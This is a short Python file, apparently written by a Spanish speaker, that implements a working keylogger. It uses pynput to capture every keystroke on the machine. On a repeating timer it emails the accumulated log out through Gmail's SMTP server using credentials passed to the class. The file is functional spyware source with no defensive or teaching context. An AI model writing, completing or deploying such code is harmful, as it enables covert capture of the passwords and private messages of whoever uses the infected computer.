import pynput
import threading
import smtplib

from pynput import keyboard

log = ""

class Keylogger:

    def __init__(self,intervalo,email,password):
        self.log = "Keylogger iniciado!"
        self.intervalo = intervalo
        self.email = email
        self.password = password

    def append_to_log(self,string):
        self.log = self.log + string


    def capturar_teclas(self,key):
        try:
           current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)


    def reporte(self):
        self.enviar_email(self.email,self.password,"\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.intervalo,self.reporte)
        timer.start()
        

    def enviar_email(self,email,password,mensaje):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,mensaje)
        server.quit()


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.capturar_teclas)
        with keyboard_listener:
            self.reporte()
            keyboard_listener.join()
